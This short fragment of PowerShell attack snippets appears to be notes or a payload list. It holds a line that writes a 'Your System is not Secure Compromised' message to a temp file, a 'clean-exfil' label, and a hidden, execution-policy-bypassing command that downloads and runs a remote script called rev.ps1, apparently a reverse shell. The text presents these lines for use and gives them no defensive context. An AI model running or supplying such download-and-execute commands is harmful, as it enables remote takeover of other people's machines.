...
echo "`nYour System is not Secure Compromised by |JUST HACKED ON|" >> $Env:temp\foo.txt
...
clean-exfil
powershell.exe -Windowstyle Hidden -Exec Bypass -NonI -C "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cyberforce47/PWSH/main/rev.ps1');"
